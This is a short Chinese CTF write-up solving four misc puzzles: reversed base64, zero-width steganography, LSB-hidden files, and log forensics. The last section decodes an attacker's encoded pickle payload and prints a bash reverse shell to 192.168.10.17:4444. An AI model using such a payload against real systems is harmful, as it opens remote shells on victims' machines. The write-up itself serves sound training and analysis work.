---
title: '2024 某内部赛 Writeup'
description: '大小为164 而内容 仅有几字节，推测为零宽隐写'
pubDate: 2024-10-10
author: 'IHK-1'
tags: ['CTF', '内部赛', '2024']
---

# MISC1
stegslove 

```plain
==QTh9lMx8Fd08VZt9FdFNTb

reverse:
  ==QTh9lMx8Fd08VZt9FdFNTb

base64:
  m3Et_me_4t_12_aM
```

# MISC2

```plain
data -> reverse -> out.zip
```

大小为164 而内容 仅有几字节，推测为零宽隐写

根据已有零宽字符解码即可

```plain
flag{maybe_you_kn0w_the_Unicode_Steganography}
```

# MISC3
根据题目信息可知隐写方式为 LSB

分离出 zip 文件

内容头为base64编码的 PNG 头，直接进行base64解码得到 flag 图片

# MISC4

浏览日志发现用户通过 user 传参进行命令执行

将最后一次传参进行url解码并base64解码

```plain
STAKcDAKMFMnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEwLjE3LzQ0NDQgMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4=

urldecode:
  STAKcDAKMFMnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjE3LzQ0NDQgMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4=

bases64:
  'bash -i >& /dev/tcp/192.168.10.17/4444 0>&1'

发现bash反弹shell
  flag{192.168.10.17_4444}
```

